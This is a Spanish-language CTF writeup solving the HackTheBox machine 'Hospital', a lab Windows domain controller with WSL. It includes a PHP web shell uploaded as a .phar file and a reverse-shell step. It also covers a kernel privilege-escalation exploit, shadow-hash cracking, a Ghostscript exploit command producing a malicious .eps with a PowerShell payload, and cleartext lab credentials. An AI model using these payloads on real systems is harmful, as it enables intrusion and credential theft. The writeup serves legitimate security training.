---
title: HTB Hospital Writeup
date: 2025-04-19 10:45:05 -05:00
author: retxus
categories: [HTB, Windows - AD]
tags: [Windows, http, https, Abusing File Upload (.phar extension), GameOver(lay) Privesc, Shadow Hash Cracking, Sending Malicious (.eps), Abusing XAMPP]
comments: false
image:
  path: /assets/img/HTB-Hospital/Hospital.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Hospital` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.241
PING 10.10.11.241 (10.10.11.250) 56(84) bytes of data.
64 bytes from 10.10.11.241: icmp_seq=1 ttl=127 time=96.6 ms

--- 10.10.11.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 96.571/96.571/96.571/0.000 ms
```

Vemos que el `ttl` de la máquina es de `127`, el cual está próximo a `128` por ende nos encontramos ante una máquina `Windows`.

Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.

```bash
#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

IP="$1"

if [ -z "$IP" ]; then
  echo "Uso: $0 <IP>"
  exit 1
fi

TEMP_FILE=$(mktemp)

echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"

# Extraer los puertos abiertos
PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)

rm "$TEMP_FILE"

if [ -z "$PORTS" ]; then
  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
  exit 1
fi

echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"

nmap -sCV -p"$PORTS" "$IP" -oN target

echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
```

De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.

```bash
sudo ./scan.sh 10.10.11.44
```

```bash
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-04-18 04:52:17Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-18T04:53:17+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-04-16T17:01:25
|_Not valid after:  2025-10-16T17:01:25
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6013/tcp open  msrpc             Microsoft Windows RPC
6403/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6634/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-18T04:53:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
```
Vemos que tenemos un dominio `hospital.htb`, así que lo agregamos al `/etc/hosts`.

```bash
127.0.0.1	localhost
::1		localhost
127.0.0.1	machinename.localhost	machinename

10.10.11.241    hospital.htb
```

Como hay muchos puertos abiertos y puede llegar a ser abrumador, vamos a ir uno por uno y vamos descartando cosas que no se ven interesantes. Algo interesante que vemos es que por los puertos `22` y `8080` corren servicios de `ubuntu` entonces podemos asumir que se esta usando un `WSL`, así que si llegamos a ganar acceso por alguno de esos lados podemos asumir que nos encontrariamos ante una máquina `linux`.

## Enumeración WEB

Si vamos al servicio que nos ofrecen por el puerto `8080`, nos encontramos ante una `web` de lo que parece ser un `hospital`, podemos iniciar sesión o registrarnos. Si probamos credenciales tipicas, podemos conectarnos como `admin` con la contraseña `123456`, pero no tiene datos de interes expuestos. Al iniciar sesión, nos encontramos ante un apartado en donde podemos subir archivos.

![](/assets/img/HTB-Hospital/1_Hospital.png)

Como tal, no nos dicen el tipo de archivos que aceptan, su extension o algo similar, pero la `web` usa como lenguaje `php`, así que podriamos probar jugar con ese tipo de archivos. Mientras tanto, podemos ver si existe alguna ruta interesante.

```bash
ffuf -c -t 100 -w SecLists/directory-list-2.3-medium.txt -u "http://hospital.htb:8080/FUZZ" -e php -fl 1
```

Vemos `uploads`, podemos pensar que allí se guardan los archivos que se suben al servidor.

## Upload file ".phar" to RCE

Luego de probar diferentes extensiones para `php`, vemos que `.phar` es una de las que acepta y deja subir, sin embargo, si tratamos de usar el típico código en `php` para ejecutar comandos haciendo uso de funciones como `shell_exec, exec, passthru`, vemos que no nos muestra los datos, entonces podemos asumir que tienes bloqueadas ciertas funciones, pero podemos hacer uso del siguiente código.

```bash
<?php
    echo fread(popen($_GET['cmd'], 'r'), 10000);
?>
```

Vemos que ahora ya logramos ejecutar comandos y efectivamente estamos ante un `WSL`.

![](/assets/img/HTB-Hospital/2_Hospital.png)

Para ganar acceso, podemos ir a esta [web](https://www.revshells.com/){:target="_blank"}, recomiendo usar `nc mkfifo` en formato `URLencode` para que no tengamos problemas al entablar la conexión. Con esto ya tenemos acceso al `WSL`.

![](/assets/img/HTB-Hospital/3_Hospital.png)

## GameOver(lay) exploit

En el directorio donde se encuentra el servicio `web`, hay un `config.php` el cual tiene credenciales para conectarse a una base de datos, pero con dichas credenciales no llegamos a nada relevante. Si vemos por la versión del `kernel` que está en uso y buscamos algo referente dicha versión, nos econtramos con un `exploit` [GameOver(lay) Ubuntu Privilege Escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629){:target="_blank"}. Apoyandonos en esto, logramos escalar nuestros privilegios y convertirnos en `root`.

![](/assets/img/HTB-Hospital/4_Hospital.png)

Como tal, no vemos nada relevante, sin embargo, estamos como `root`, podemos leer el `/etc/shadow`, vemos que hay un usuario llamado `drwilliams` y tiene un `hash` un tanto diferente. Vamos a tratar de romperlo con `john`

![](/assets/img/HTB-Hospital/5_Hospital.png)

```bash
john --wordlist=rockyou.txt hash
```

Nos descifra la contraseña, podríamos validar si existe el usuario en el equipo principal.

```bash
netexec smb hospital.htb -u "drwilliams" -p 'qwe123!@#'

SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@#
```

Nos pone un `[+]`, si enumeramos por `smb` recursos compartidos no tenemos nada y el usuario no parece pertenecer al grupo `remote management user` por ende no podemos hacer uso de `evil-winrm`, para conectarnos por el servicio de `WinRM`.

## Malicious ".eps" File

Recordemos que por el puerto `443` corre otro servicio `web` llamado `Webmail`, este es un servicio de correo electrónico, vamos a ver si logramos autenticarnos como `drwilliams` con nuestra credencial.

![](/assets/img/HTB-Hospital/6_Hospital.png)

Logramos ganar acceso, y vemos que tenemos un mensaje de `drbrown`. Este nos dice que le enviemos información en un archivo `.eps`. **Un archivo EPS (Encapsulated PostScript) es un formato de archivo gráfico vectorial estándar utilizado para almacenar ilustraciones y gráficos vectoriales**.

### Ghostscript command injection

Buscando un poco vemos que podemos hacer un archivo malicioso en donde podemos ejecutar comandos, [aquí](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection){:target="_blank"} tenemos un proyecto que nos automatiza eso. En la misma `web` de donde nos facilita el comando para ganar acceso con `nc mkfifo`. Podemos hacer uso de `PowerShell #3 (Base64)`.

```bash
python CVE_2023_36664_exploit.py --payload "powershell -e payload_bsae_64" -g -x eps
```

Nos crea un archivo `malicious.eps` y lo que hacemos es responder al correo de `drbrown` y adjuntarle en archivo, claro, y ponernos en escucha con `nc` para ver si se ejecuta el comando. 

## Ganando acceso (al equipo principal)

Bueno, si funcionó y ahora logramos ganar acceso a la máquina real.

![](/assets/img/HTB-Hospital/7_Hospital.png)

En el directorio donde nos encontramos cuando ganamos acceso hay un pequeño `script`, el cual contiene una credencial.

![](/assets/img/HTB-Hospital/8_Hospital.png)

Podemos ver si es válida para el usuario `drbrown` y de paso vemos si pertenece al grupo `remote management user` para ganar acceso haciendo uso de `evil-winrm`.

```bash
netexec winrm hospital.htb -u 'drbrown' -p 'chr!$br0wn'

WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
WINRM       10.10.11.241    5985   DC               [+] hospital.htb\drbrown:chr!$br0wn (Pwn3d!)
```

Nos pone un `Pwn3d`, por ende ya podríamos hacer uso de `evil-winrm` y de paso vemos la primera parte de la máquina, la `user.txt`.

```bash
evil-winrm -u 'drbrown' -p 'chr!$br0wn' -i hospital.htb
```

![](/assets/img/HTB-Hospital/9_Hospital.png)

## Escalada de privilegios

Si vamos a `C:\xampp\htdocs`, es allí donde se encuentra corriendo el sito `web` de `Webmail`, no sabemos quién está levantando el servicio, pero podemos tratar de subir el mismo `pwned.phar`, para ver qué se acontece.

![](/assets/img/HTB-Hospital/10_Hospital.png)

Si vamos a la `web` y ejecutamos el comando `whoami`, vemos que es `nt authority\system` quien está ejecutando el servicio.

![](/assets/img/HTB-Hospital/11_Hospital.png)

Bueno, podríamos hacer uso del mismo `payload` que se usó para crear el `.eps` para ganar acceso y con eso ya logramos ver la `root.txt`.

![](/assets/img/HTB-Hospital/12_Hospital.png)
